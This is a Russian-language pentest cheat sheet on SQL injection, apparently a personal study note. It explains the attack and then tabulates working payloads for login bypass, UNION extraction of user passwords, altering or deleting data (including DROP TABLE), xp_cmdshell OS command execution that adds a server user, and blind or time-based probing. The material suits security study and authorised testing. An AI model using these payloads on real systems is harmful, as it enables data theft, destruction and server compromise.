#Пентест #Веб
**_SQL-инъекция (SQLi)_** - позволяет вмешиваться в запросы, которые приложение делает к своей базе данных. Это позволяет просматривать данные, которые обычно не возможно получить. Во многих случаях злоумышленник может изменять или удалять эти данные, вызывая постоянные изменения в содержимом или поведении приложения.

Работает совместно с [[curl]]

## Последствия атак
- Несанкционированный доступ к данным.
- Постоянный черный ход в системы организации, что приводит к долгосрочной угрозе, которая может оставаться незамеченной в течение длительного периода времени;
- Скомпрометировать базовый сервер или другую внутреннюю инфраструктуру;
- Осуществить атаку типа "отказ в обслуживании".

## Примеры SQL-инъекций
- Получение скрытых данных, когда вы можете изменить SQL-запрос, чтобы вернуть дополнительные результаты.
- Подрыв логики приложения, когда можно изменить запрос, чтобы вмешаться в логику приложения.
- Атаки UNION, когда можно получить данные из разных таблиц базы данных.
- Изучение базы данных, когда можно получить информацию о версии и структуре базы данных.
- Слепая SQL-инъекция, когда результаты контролируемого вами запроса не возвращаются в ответах приложения.

## Команды

| **Тип инъекции**          | **Пример**                                                                              | **Описание**                                                                       |
| ------------------------- | --------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| **Обход аутентификации**  | `' OR '1'='1`                                                                           | Возвращает все строки, так как условие `'1'='1'` всегда истинно.                   |
|                           | `admin' --`                                                                             | Закомментирует оставшуюся часть запроса, обходя проверку пароля.                   |
|                           | `' OR 'a'='a'; --`                                                                      | Аналогично первой инъекции, но с использованием комментария.                       |
| **Извлечение данных**     | `' UNION SELECT null, username, password FROM users --`                                 | Добавляет данные из таблицы `users` к результату запроса.                          |
|                           | `' UNION SELECT null, table_name, null FROM information_schema.tables --`               | Извлекает имена таблиц из базы данных.                                             |
|                           | `' UNION SELECT null, column_name, null FROM information_schema.columns --`             | Извлекает имена столбцов из базы данных.                                           |
| **Изменение данных**      | `'; UPDATE users SET password = 'hacked' WHERE username = 'admin' --`                   | Изменяет пароль пользователя `admin` на `hacked`.                                  |
|                           | `'; INSERT INTO users (username, password) VALUES ('hacker', '123') --`                 | Добавляет нового пользователя `hacker` с паролем `123`.                            |
| **Удаление данных**       | `'; DROP TABLE users --`                                                                | Удаляет таблицу `users`.                                                           |
|                           | `'; DELETE FROM users WHERE username = 'admin' --`                                      | Удаляет пользователя `admin` из таблицы `users`.                                   |
| **Выполнение команд ОС**  | `'; EXEC xp_cmdshell('dir C:\') --`                                                     | Выполняет команду `dir C:\` на сервере (если функция `xp_cmdshell` включена).      |
|                           | `'; EXEC xp_cmdshell('net user hacker /add') --`                                        | Добавляет нового пользователя `hacker` на сервере.                                 |
| **Слепая SQL-инъекция**   | `' AND (SELECT COUNT(*) FROM users) > 0 --`                                             | Проверяет, существует ли таблица `users`.                                          |
|                           | `' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username = 'admin') = 'a' --` | Проверяет, равен ли первый символ пароля пользователя `admin` букве `a`.           |
| **Использование времени** | `' AND IF(1=1, SLEEP(5), 0) --`                                                         | Если условие истинно, сервер "засыпает" на 5 секунд (полезно для слепых инъекций). |
|                           | `' AND IF(1=2, SLEEP(5), 0) --`                                                         | Если условие ложно, сервер не "засыпает".                                          |